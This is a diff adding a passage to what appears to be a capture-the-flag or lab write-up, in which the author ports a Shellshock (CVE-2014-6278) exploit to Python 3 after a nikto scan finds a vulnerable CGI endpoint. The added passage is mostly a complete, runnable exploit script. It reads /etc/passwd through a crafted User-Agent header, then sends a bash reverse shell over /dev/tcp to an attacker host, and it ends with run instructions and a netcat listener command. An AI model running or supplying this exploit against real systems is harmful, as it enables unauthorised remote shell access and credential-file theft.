@@ -213,7 +213,71 @@ mrbunny $ nikto -h 10.80.160.139
 here nikto detect a vulnerable end point of /cgi-bin/test.cgi it's a vulnerable to shellshock.
 i use my osint skill and found a shellshock exploit by using CVE-2014-6278,and then modified it's so it's work on out target
 linke:https://www.exploit-db.com/exploits/39568
+it's require python2 version i dont have so i convert this exploit into python3 so i use it
 
+eploit:
+```
+#!/usr/bin/env python3
+
+import requests
+import time
+import sys
+
+if len(sys.argv) < 4:
+    print("\n[*] Cisco UCS Manager 2.1(1b) Shellshock Exploit")
+    print("[*] Usage: python3 shellshock.py <Victim IP> <Attacking Host> <Reverse Shell Port>")
+    print("[*]")
+    print("[*] Example: python3 shellshock.py 127.0.0.1 127.0.0.1 4444")
+    print("[*] Listener: nc -lvnp <port>\n")
+    sys.exit()
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+ucs = sys.argv[1]
+attackhost = sys.argv[2]
+revshellport = sys.argv[3]
+
+# ⚠️ CHANGE THIS PATH if your CGI file is different
+url = "http://" + ucs + "/cgi-bin/test.cgi"
+
+headers_check = {
+    "User-Agent": '() { test;}; echo "Content-type: text/plain"; echo; echo $(</etc/passwd)'
+}
+
+headers_shell = {
+    "User-Agent": f'() {{ :; }}; /bin/bash -i >& /dev/tcp/{attackhost}/{revshellport} 0>&1'
+}
+
+def exploit():
+    try:
+        requests.get(url, headers=headers_shell, timeout=5)
+    except Exception as e:
+        if "timed out" in str(e):
+            print("[+] Exploit sent, check your listener!")
+        else:
+            print("[-] Exploit failed")
+            print("[-] Error:", e)
+
+def main():
+    try:
+        r = requests.get(url, headers=headers_check, timeout=5)
+        if "root:" in r.text:
+            print("[+] Host appears vulnerable! Spawning reverse shell...")
+            time.sleep(2)
+            exploit()
+        else:
+            print("[-] Host does not appear vulnerable.")
+    except Exception as e:
+        print("[-] Error:", e)
+
+if __name__ == "__main__":
+    main()
+```
+how to run:
+ python 39568.py target_ip your_p  4646
+run a netcat for listening
+nc -lvnp 4646
 
 
 
